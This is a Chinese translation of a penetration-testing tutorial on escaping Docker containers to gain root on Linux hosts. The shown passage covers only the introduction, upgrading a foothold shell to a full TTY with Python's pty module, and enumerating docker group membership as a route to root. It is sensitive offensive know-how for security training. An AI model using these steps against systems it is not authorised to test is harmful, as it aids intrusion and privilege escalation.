<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-Docker 容器" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-Docker 容器 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-Docker 容器 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Docker Breakout – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Docker Breakout – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.bd0a5f0e.css">
<script src="/web/assets/js/runtime~main.224207a9.js" defer="defer"></script>
<script src="/web/assets/js/main.e046f592.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/渗透">渗透</a><button aria-label="折叠侧边栏分类 &#x27;渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities">Linux 提权-Capabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs">Linux 提权-Cron Jobs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器">Linux 提权-Docker 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器">Linux 提权-LXD 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF">Linux 提权-MySQL UDF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享">Linux 提权-NFS 共享</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1">Linux 提权-SUID_SGID_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2">Linux 提权-SUID_SGID_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1">Linux 提权-Sudo_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2">Linux 提权-Sudo_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用">Linux 提权-内核利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权指南">Linux 提权指南</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">Linux</a><button aria-label="展开侧边栏分类 &#x27;Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">Windows</a><button aria-label="展开侧边栏分类 &#x27;Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/渗透"><span itemprop="name">渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-Docker 容器</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-Docker 容器</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/docker-breakout-lpe/" target="_blank" rel="noopener noreferrer">Docker Breakout – Linux Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 什么是 Docker ？</a></li>
<li><a href="#id2">2 寻找 Docker 权限</a>
<ul>
<li><a href="#id2.1">2.1 升级 Shell 到完整 TTY</a></li>
<li><a href="#id2.2">2.2 手动枚举 Docker 组中的用户</a></li>
<li><a href="#id2.3">2.3 手动枚举 Docker 服务</a></li>
<li><a href="#id2.4">2.4 手动枚举 Docker 镜像和默认用户</a></li>
<li><a href="#id2.5">2.5 工具枚举 Docker – LinPEAS</a></li>
</ul>
</li>
<li><a href="#id3">3 场景1：通过滥用 Docker 组权限提权</a>
<ul>
<li><a href="#id3.1">3.1 在 GTFOBins 上查找 Docker 利用</a></li>
<li><a href="#id3.2">3.2 在 Docker 容器中挂载宿主机文件系统</a></li>
<li><a href="#id3.3">3.3 突破 Docker 容器以获取宿主机 Root 权限</a></li>
</ul>
</li>
<li><a href="#id4">4 场景2：直接在特权容器中立足</a>
<ul>
<li><a href="#id4.1">4.1 确认处于 Docker 容器中</a></li>
<li><a href="#id4.2">4.2 确认这是一个特权容器</a></li>
<li><a href="#id4.3">4.3 突破特权容器</a>
<ul>
<li><a href="#id4.3.1">4.3.1 添加 &quot;root&quot; 用户</a></li>
<li><a href="#id4.3.2">4.3.2 登录 &quot;root&quot; 用户</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id5">5 场景3：直接在非特权容器中立足</a>
<ul>
<li><a href="#id5.1">5.1 确定这不是特权容器</a></li>
<li><a href="#id5.2">5.2 寻找其它突破方法</a>
<ul>
<li><a href="#id5.2.1">5.2.1 查找已启用的有趣功能 – CAP_SYS_ADMIN</a></li>
<li><a href="#id5.2.2">5.2.2 确认 AppArmor 未加载</a></li>
</ul>
</li>
<li><a href="#id5.3">5.3 使用工具寻找 Docker 突破口 – LinPEAS</a>
<ul>
<li><a href="#id5.3.1">5.3.1 找到很多关于容器的好信息</a></li>
</ul>
</li>
<li><a href="#id5.4">5.4 使用 release_agent Breakout 2 方法突破非特权容器</a></li>
</ul>
</li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在本文中，我们将探索使用 Docker 突破技术在目标 Linux 主机上提升权限。</p>
<p>我们将回顾三种不同的 Docker 突破场景。在每种场景中，我们都会看到一种可以用来突破 Docker 容器的不同技术，而每种情况都会让我们在目标主机上获得 root shell！</p>
<p>首先，我们要在目标主机上站稳脚跟，然后经过手动枚举，我们会发现当前用户已加入 docker 组。发现这一点后，我们将枚举 docker 服务，并收集我们所需的信息，以便投入到 docker 容器中。我们通过使用 GTFOBins 找到一个利用，使我们能够以 root 身份操纵实际的文件系统。</p>
<p>另一种场景是，我们在目标系统中获得了立足点；然而，我们会发现，我们的立足点实际上是在目标主机上运行的 docker 实例中。然后，我们将列举容器内的一些东西，这些东西将表明我们实际上是在一个有特权的容器内，而脱离容器将变的轻而易举。</p>
<p>最后一种场景与上一种场景类似，只是我们会发现我们并不在特权容器中。但幸运的是，经过枚举会发现我们实际上拥有正确的权限组合，可以让我们突破 docker 容器，从而在宿主机上获得 root shell。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1什么是-docker-"><strong><div id="id1">1、什么是 Docker ?</div></strong><a href="#1什么是-docker-" class="hash-link" aria-label="1什么是-docker-的直接链接" title="1什么是-docker-的直接链接">​</a></h2>
<p>Docker 是一个开放平台，用于开发、发布和运行独立于主机基础设施的应用程序。</p>
<p>使用 Docker 可以将应用程序打包并在一个称为容器的松散隔离环境中运行。这种隔离和安全性允许许多容器同时在指定主机上运行。</p>
<blockquote>
<p>容器是轻量级的，包含运行应用程序所需的一切。</p>
</blockquote>
<p>Docker 使用客户端-服务器架构。 Docker 客户端与 Docker 守护进程通信，后者负责构建和运行 Docker 容器的繁重工作。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927549-1726883486-07b1b6fd2e32853c6cb6f869a8030d01.png" width="872" height="453" class="img_ev3q"></p>
<p>作为攻击者，我们可以看到 <strong>docker run</strong> 是上面三个客户端命令中最有趣的，因为它能让我们进入一个容器。</p>
<p>关于 Docker，还有一些其他有趣的事情需要记住，这将有助于我们定位这项服务：</p>
<ul>
<li>docker 容器通常以 root 作为默认用户运行。</li>
<li>默认情况下，容器以 root 身份运行，因为 <strong>dockerd</strong>（docker 守护进程）默认也以 root 身份运行。</li>
<li>容器启动选项 <strong>–privileged</strong> 为容器提供了所有功能。换句话说，容器几乎可以做主机能做的所有事情。</li>
<li>docker 组中的用户对于 docker 服务而言相当于 root。</li>
</ul>
<blockquote>
<p>注：此处及后文提到的 docker 容器用户和 docker 进程用户并非同一个身份。</p>
<p>docker 容器用户：指进入容器之后，在容器操作环境中的用户身份。</p>
<p>docker 进程用户：指容器外部 docker 守护进程是以宿主机的哪个用户身份去运行的。</p>
</blockquote>
<p>考虑到所有这些，让我们来看一些例子！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2寻找-docker-权限"><strong><div id="id2">2、寻找 Docker 权限</div></strong><a href="#2寻找-docker-权限" class="hash-link" aria-label="2寻找-docker-权限的直接链接" title="2寻找-docker-权限的直接链接">​</a></h2>
<p>对于此示例，我们假设以标准用户 dawker 在目标 Linux 主机上获得了立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174927000-1867055629-7946f6b75f1ed05f98c09d2f18d0b682.png" width="500" height="128" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21升级-shell-到完整-tty"><strong><div id="id2.1">2.1、升级 Shell 到完整 TTY</div></strong><a href="#21升级-shell-到完整-tty" class="hash-link" aria-label="21升级-shell-到完整-tty的直接链接" title="21升级-shell-到完整-tty的直接链接">​</a></h4>
<p>站稳脚跟后我们要做的第一件事就是将 shell 升级为完整的 TTY。我们可以使用以下命令集来完成此操作：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CTRL + Z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stty raw -echo;fg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export TERM=xterm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174926882-2050122041-e78398172aaa1bf074b4f5c4b845ee9c.png" width="566" height="203" class="img_ev3q"></p>
<p>现在有了完整的 TTY，我们可以使用箭头浏览命令历史记录、使用制表符补全、清除终端等。</p>
<blockquote>
<p>完整 TTY 对于我们将要使用的漏洞利用来说还是很有必要的。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="22手动枚举-docker-组中的用户"><strong><div id="id2.2">2.2、手动枚举 Docker 组中的用户</div></strong><a href="#22手动枚举-docker-组中的用户" class="hash-link" aria-label="22手动枚举-docker-组中的用户的直接链接" title="22手动枚举-docker-组中的用户的直接链接">​</a></h4>
<p>一旦建立了完整的 TTY，应该执行的第一对命令是 <strong>whoami</strong> 和 <strong>id</strong>。这将向我们显示当前是哪个用户以及哪个组。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">whoami ; id</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240629174925985-922313646-9e47a7e72cd227503fd90cdf1b2d9599.png" width="540" height="63" class="img_ev3q"></p>
<p>在这里可以看到当前用户是一个名为 <strong>dawker</strong> 的标准用户。然而，在该用户所属的组列表中，我们可以看到一个有趣的发现--当前用户已位于 <strong>docker</strong> 组中！</p>
<blockquote>
<p>加入 docker 组是一个有趣的发现，因为如果 docker 使用的是默认配置，那么 root 权限就是有保障的。</p>
</blockquote>
<p>但大多数时候，我们不会直接就以 docker 组中的用户身份在目标主机上立足，因此，我们需要对 docker 组中的用户进行水平提权，然后才能获得 root 权限。</p>
<p>如果是这种情况，那么我们可以使用以下 <strong>for 循环</strong> 来寻找 docker 组中的用户：</p>
